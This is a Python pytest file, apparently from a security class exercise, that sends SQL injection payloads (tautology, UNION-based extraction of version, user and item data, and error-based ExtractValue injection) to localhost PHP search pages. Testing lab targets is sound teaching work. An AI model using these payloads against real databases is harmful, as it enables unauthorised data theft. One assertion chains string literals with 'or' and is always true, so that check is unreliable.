import pytest
import requests

def test_this_always_succeeds():
    assert True

def test_true_by_default():
    # logic here
    pass

def test_find_pages():
    # Set up the test parameters
    # urls
    urls = ["http://localhost:4000/find.php","http://localhost:4000/find3.php"]
    # in the find2.php file is double quoted the search variable so e need to modify a bit the payload
    double_quoted_urls = ["http://localhost:4000/find2.php",]
    # payload for surrounded single quoted variables(e.g find.php & find3.php)
    payload_sql_injection = "' OR 1=1 LIMIT 1 OFFSET 0; -- -"
    payload_union_injection = "' UNION SELECT VERSION(), USER() -- -"
    payload2_union_injection = "' UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -"
    payload_error_injection = "' AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -"
    # payload for surrounded double quoted variables(e.g find2.php)
    payload_sql_injection_dq = '" OR 1=1 LIMIT 1 OFFSET 0; -- -'
    payload_union_injection_dq = '" UNION SELECT VERSION(), USER() -- -'
    payload2_union_injection_dq = '" UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -'
    payload_error_injection_dq = '" AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -'
    
    # test for find pages that always succeeds
    def test_this_always_succeeds(url, payload):
     # Send the request to the page with the injection payload
        response_sql = requests.get(url, params={"search": payload})
        # Check that the expected result is displayed on the page
        # assert expected_result in response.text
        assert "error in your SQL syntax" not in response_sql.text
        assert "Apple" or  "8.0.32" or "root" or "172.17.0.1" in response_sql.text
    # tests for find pages to find something from errors
    def test_this_always_fails(url, payload):
        response_sql = requests.get(url, params={"search": payload})
        # verify if the error in SQL syntax is what we expect: an XPATH error
        assert "error in your SQL syntax" not in response_sql.text
        assert "XPATH" in response_sql.text
    
    # perform the tests
    # for find.php and find3.php
    for url in urls:
        # normal sql injections
        print("test for url ", url)
        test_this_always_succeeds(url, payload=payload_sql_injection)
        # union-based injections
        test_this_always_succeeds(url, payload= payload_union_injection)
        test_this_always_succeeds(url, payload=payload2_union_injection)
        # error-based injections
        test_this_always_fails(url, payload=payload_error_injection)
    # for find2.php since the search variable is surround by double quotes
    for url in double_quoted_urls:
        test_this_always_succeeds(url, payload=payload_sql_injection_dq)
        # union-based injections
        test_this_always_succeeds(url, payload= payload_union_injection_dq)
        test_this_always_succeeds(url, payload=payload2_union_injection_dq)
        # error-based injections
        test_this_always_fails(url, payload=payload_error_injection_dq)
    
test_find_pages()